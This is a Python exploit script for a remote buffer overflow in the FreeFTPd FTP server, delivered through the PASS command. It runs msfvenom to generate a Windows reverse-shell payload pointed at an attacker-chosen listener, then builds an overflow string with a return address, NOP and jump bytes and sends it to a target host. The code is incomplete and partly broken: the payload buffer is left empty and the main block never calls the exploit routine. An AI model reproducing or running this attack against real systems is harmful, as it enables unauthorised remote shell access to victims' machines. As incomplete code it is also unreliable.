import argparse
import socket
import sys
import subprocess
from log_colors import *

class FreeFTPd_Remote_BuffOfw:

    def __init__(self, rhost, rport, user, lhost, lport, fname):
        print (LogColors.BLUE + "victim host: " + rhost + "..." + LogColors.ENDC)
        self.rhost, self.rport = rhost, rport
        self.lhost, self.lport = lhost, lport
        self.user = user
        self.fname = fname

    def generate_payload(self):
        print (LogColors.BLUE + "generate reverse shell payload..." + LogColors.ENDC)
        msfv = "msfvenom -p windows/shell_reverse_tcp"
        msfv += " LHOST=" + self.lhost
        msfv += " LPORT=" + self.lport
        msfv += " -f python"
        msfv += " -b '\\x00\\x0a\\x0d'"
        # msfv += " -o " + self.fname
        print (LogColors.YELLOW + msfv + LogColors.ENDC)
        try:
            #p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
            #p.wait()
            out = subprocess.check_output(msfv.split())
            print (LogColors.YELLOW + out + LogColors.ENDC)
            print (LogColors.GREEN + "revshell payload successfully gen :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)
            sys.exit()

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        self.generate_payload()
        ret = "\xbb\x14\x40\x00"
        nop = "\x90"
        buf = "" # self.generate_payload() result file content
        exploit = buf + nop + "\xe9\xe3\xfc\xff\xff" + "\xeb\xf9" + "\x90\x90"
        exploit += ret
        password = "PASS " + exploit + "\r\n"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.rhost, self.rport))
        sock.recv(1024)
        sock.sendall("USER " + self.user + "\r\n")
        sock.recv(1024)
        sock.sendall(password)
        sock.close()
        print (LogColors.GREEN + "successfully send payload :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target ip/host")
    parser.add_argument('-p','--port', required = True, help = "target ip/host")
    parser.add_argument('-lh','--lhost', required = True, help = "revshell listener host")
    parser.add_argument('-lp','--lport', required = True, help = "revshell listener port")
    parser.add_argument('-f','--filename', required = True, help = "filename for payload code")
    parser.add_argument('-u','--user', required = True, help = "ftp username")
    args = vars(parser.parse_args())
    host, port = args['target'], args['port']
    lhost, lport = args['lhost'], args['lport']
    user, fname = args['user'], args['filename']
    cve = FreeFTPd_Remote_BuffOfw(host, port, user, lhost, lport, fname)
    cve.generate_payload()

